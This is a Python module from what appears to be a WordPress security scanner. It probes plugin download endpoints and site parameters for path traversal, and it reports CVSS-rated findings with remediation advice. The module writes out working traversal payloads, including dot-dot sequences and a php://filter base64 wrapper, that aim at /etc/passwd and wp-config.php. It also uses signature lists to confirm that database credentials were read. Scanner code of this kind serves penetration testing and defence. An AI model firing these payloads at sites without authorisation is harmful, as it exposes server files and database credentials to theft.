"""Path traversal testing on plugin parameters."""

from __future__ import annotations

from typing import TYPE_CHECKING

from core.models import Compliance, Evidence, Finding, Severity, Confidence, FindingType
from modules.base import BazookaModule, ModuleResult

if TYPE_CHECKING:
    from core.engine import ScanContext
    from core.session import BazookaSession


# Signatures that confirm successful traversal
PASSWD_SIGNATURES = ["root:x:0:0", "root:x:0:0:root", "daemon:x:1:1"]
WPCONFIG_SIGNATURES = ["DB_NAME", "DB_PASSWORD", "DB_HOST", "table_prefix", "AUTH_KEY"]


class DirectoryTraversalModule(BazookaModule):
    name = "vuln.directory_traversal"
    phase = "vuln"
    description = "Path traversal testing on plugin parameters"
    profiles = ["aggressive"]

    async def run(self, ctx: ScanContext, session: BazookaSession) -> ModuleResult:
        result = ModuleResult()
        base = ctx.target.url
        wp_content = ctx.target.wp_content_path.rstrip("/")

        confirmed_traversals: list[dict] = []
        total_tests = 0

        # ── Generic traversal payloads ───────────────────────────────────────
        generic_params = ["file", "path", "template", "doc", "page", "include", "src"]
        generic_payloads = [
            ("../../../etc/passwd", "passwd"),
            ("....//....//....//etc/passwd", "passwd"),
            ("..\\..\\..\\etc\\passwd", "passwd"),
            ("../../../wp-config.php", "wpconfig"),
            ("php://filter/convert.base64-encode/resource=../wp-config.php", "wpconfig_b64"),
        ]

        # ── Plugin-specific traversal-prone endpoints ────────────────────────
        plugin_endpoints: list[dict] = []
        for plugin in ctx.target.plugins:
            slug = plugin.slug
            tests_for_plugin = 0

            # Common vulnerable download/include paths per plugin
            vuln_paths = [
                f"{wp_content}/plugins/{slug}/includes/download.php",
                f"{wp_content}/plugins/{slug}/lib/file.php",
                f"{wp_content}/plugins/{slug}/download.php",
                f"{wp_content}/plugins/{slug}/lib/download.php",
                f"{wp_content}/plugins/{slug}/includes/file-handler.php",
            ]

            for vuln_path in vuln_paths:
                if tests_for_plugin >= 5:
                    break

                # Test with each parameter and payload
                for param in ["file", "path"]:
                    if tests_for_plugin >= 5:
                        break

                    # /etc/passwd traversal
                    plugin_endpoints.append({
                        "url": f"{base}{vuln_path}?{param}=../../wp-config.php",
                        "slug": slug,
                        "target_type": "wpconfig",
                        "payload": f"{param}=../../wp-config.php",
                    })
                    tests_for_plugin += 1

                    if tests_for_plugin < 5:
                        plugin_endpoints.append({
                            "url": f"{base}{vuln_path}?{param}=../../../etc/passwd",
                            "slug": slug,
                            "target_type": "passwd",
                            "payload": f"{param}=../../../etc/passwd",
                        })
                        tests_for_plugin += 1

            # PHP wrapper test (1 per plugin, only if under limit)
            if tests_for_plugin < 5:
                plugin_endpoints.append({
                    "url": (
                        f"{base}{wp_content}/plugins/{slug}/includes/download.php"
                        f"?file=php://filter/convert.base64-encode/resource=../wp-config.php"
                    ),
                    "slug": slug,
                    "target_type": "wpconfig_b64",
                    "payload": "file=php://filter/convert.base64-encode/resource=../wp-config.php",
                })

        # ── Run generic tests against known traversal-prone parameters ───────
        # Test on root with each parameter (for plugins that register query vars)
        for param in generic_params[:3]:  # Limit to top 3 params
            for payload, target_type in generic_payloads[:2]:  # Limit payloads
                url = f"{base}/?{param}={payload}"
                total_tests += 1

                try:
                    resp = await session.get(url, use_cache=False, follow_redirects=False)
                except Exception:
                    continue

                traversal_type = _check_traversal(resp.text, target_type)
                if traversal_type:
                    confirmed_traversals.append({
                        "url": url,
                        "slug": "core",
                        "payload": f"{param}={payload}",
                        "target_type": target_type,
                        "traversal_type": traversal_type,
                        "status": resp.status_code,
                        "body_excerpt": resp.text[:300],
                    })

        # ── Run plugin-specific endpoint tests ───────────────────────────────
        for endpoint in plugin_endpoints:
            total_tests += 1

            try:
                resp = await session.get(
                    endpoint["url"],
                    use_cache=False,
                    follow_redirects=False,
                )
            except Exception:
                continue

            # Skip generic error pages
            if resp.status_code in (404, 403, 500):
                if session.is_waf_generic_page(resp.status_code, len(resp.content)):
                    continue
                # A 404 on the PHP file itself means the endpoint doesn't exist
                if resp.status_code == 404:
                    continue

            traversal_type = _check_traversal(resp.text, endpoint["target_type"])
            if traversal_type:
                confirmed_traversals.append({
                    "url": endpoint["url"],
                    "slug": endpoint["slug"],
                    "payload": endpoint["payload"],
                    "target_type": endpoint["target_type"],
                    "traversal_type": traversal_type,
                    "status": resp.status_code,
                    "body_excerpt": resp.text[:300],
                })

        # ── Generate findings ────────────────────────────────────────────────
        if confirmed_traversals:
            for i, trav in enumerate(confirmed_traversals):
                is_wpconfig = trav["target_type"] in ("wpconfig", "wpconfig_b64")
                cvss = 9.1 if is_wpconfig else 7.5

                result.add_finding(Finding(
                    id=f"VULN-TRAVERSAL-{i + 1:03d}",
                    title=(
                        f"Path traversal confirmed on {trav['slug']} "
                        f"({'wp-config.php' if is_wpconfig else '/etc/passwd'}) "
                        f"on {ctx.target.domain}"
                    ),
                    severity=Severity.CRITICAL,
                    cvss_score=cvss,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                    confidence=Confidence.CONFIRMED,
                    finding_type=FindingType.CVE,
                    description=(
                        f"Path traversal vulnerability confirmed via {trav['payload']} on "
                        f"endpoint {trav['url']}. The server returned content matching "
                        f"{'WordPress configuration (DB credentials)' if is_wpconfig else 'Unix /etc/passwd'}. "
                        f"Traversal type: {trav['traversal_type']}."
                    ),
                    evidence=Evidence(
                        request=f"GET {trav['url']}",
                        response_status=trav["status"],
                        response_headers={},
                        response_body_excerpt=trav["body_excerpt"],
                    ),
                    impact=(
                        "Database credentials exposed — full database compromise. "
                        "Attacker can extract admin password hashes, user data, and "
                        "potentially achieve remote code execution via SQL injection "
                        "into the database."
                        if is_wpconfig else
                        "Local file read confirmed. Attacker can enumerate system "
                        "users and pivot to reading sensitive configuration files "
                        "including wp-config.php."
                    ),
                    remediation=(
                        f"Update or remove the '{trav['slug']}' plugin immediately. "
                        f"Sanitize all file path parameters using realpath() and validate "
                        f"against an allowlist. Never pass user input directly to "
                        f"file_get_contents(), include(), or fopen(). Rotate all database "
                        f"credentials and WordPress secret keys if wp-config.php was exposed."
                    ),
                    compliance=Compliance(
                        owasp_2021="A01:2021 - Broken Access Control",
                        cwe="CWE-22",
                        mitre_attack="T1005 - Data from Local System",
                    ),
                    references=[
                        "https://owasp.org/www-community/attacks/Path_Traversal",
                        "https://cwe.mitre.org/data/definitions/22.html",
                    ],
                    phase="vuln",
                    module=self.name,
                    tags=["path-traversal", "lfi", trav["slug"], "file-read"],
                ))
        else:
            # No traversal found — INFO finding
            result.add_finding(Finding(
                id="VULN-TRAVERSAL-NONE",
                title=f"No path traversal found on {ctx.target.domain}",
                severity=Severity.INFO,
                cvss_score=0.0,
                confidence=Confidence.CONFIRMED,
                finding_type=FindingType.MISCONFIGURATION,
                description=(
                    f"Tested {total_tests} path traversal payloads across "
                    f"{len(ctx.target.plugins)} detected plugin(s) and generic parameters. "
                    f"No successful traversal was detected."
                ),
                evidence=Evidence(
                    request=f"Multiple GET requests with traversal payloads",
                    response_status=0,
                    response_headers={},
                    response_body_excerpt=f"Total tests: {total_tests}, Confirmed: 0",
                ),
                impact="None — path traversal appears to be mitigated.",
                remediation="Continue monitoring for new plugin vulnerabilities.",
                compliance=Compliance(
                    owasp_2021="A01:2021 - Broken Access Control",
                    cwe="CWE-22",
                ),
                references=[],
                phase="vuln",
                module=self.name,
                tags=["path-traversal", "negative-result"],
            ))

        result.add_data("directory_traversal_tests", total_tests)
        result.add_data("directory_traversal_confirmed", len(confirmed_traversals))
        return result


def _check_traversal(body: str, target_type: str) -> str | None:
    """Check response body for traversal success indicators.

    Returns the type of traversal confirmed, or None if not confirmed.
    """
    if not body:
        return None

    if target_type == "passwd":
        for sig in PASSWD_SIGNATURES:
            if sig in body:
                return "etc_passwd_read"

    elif target_type == "wpconfig":
        match_count = sum(1 for sig in WPCONFIG_SIGNATURES if sig in body)
        if match_count >= 2:
            return "wpconfig_read"

    elif target_type == "wpconfig_b64":
        # Base64-encoded wp-config.php — check for base64 pattern
        # and decode a sample to verify
        import base64
        import re
        # Look for a long base64 string in the response
        b64_match = re.search(r'[A-Za-z0-9+/]{100,}={0,2}', body)
        if b64_match:
            try:
                decoded = base64.b64decode(b64_match.group()).decode("utf-8", errors="ignore")
                match_count = sum(1 for sig in WPCONFIG_SIGNATURES if sig in decoded)
                if match_count >= 2:
                    return "wpconfig_b64_read"
            except Exception:
                pass

    return None
